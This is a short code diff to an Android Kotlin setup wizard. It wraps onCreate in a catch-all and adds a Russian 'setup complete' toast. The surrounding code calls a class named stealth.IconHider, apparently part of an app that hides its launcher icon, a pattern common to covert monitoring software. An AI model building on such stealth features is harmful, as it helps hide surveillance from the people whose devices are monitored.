@@ -61,9 +61,14 @@ class SetupActivity : Activity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        step = savedInstanceState?.getInt("step") ?: 0
-        awaitingPermissions = savedInstanceState?.getBoolean("perm") ?: false
-        if (!awaitingPermissions) askRuntimePermissions()
+        try {
+            step = savedInstanceState?.getInt("step") ?: 0
+            awaitingPermissions = savedInstanceState?.getBoolean("perm") ?: false
+            if (!awaitingPermissions) askRuntimePermissions()
+        } catch (t: Throwable) {
+            // Never let the wizard take the process down.
+            finish()
+        }
     }
 
     override fun onSaveInstanceState(outState: Bundle) {
@@ -162,6 +167,12 @@ class SetupActivity : Activity() {
         // started again.
         try {
             com.sp.core.stealth.IconHider.show(this)
+        } catch (_: Throwable) {
+        }
+        try {
+            android.widget.Toast.makeText(
+                this, "Настройка завершена", android.widget.Toast.LENGTH_SHORT
+            ).show()
         } catch (_: Throwable) {
         }
         finish()
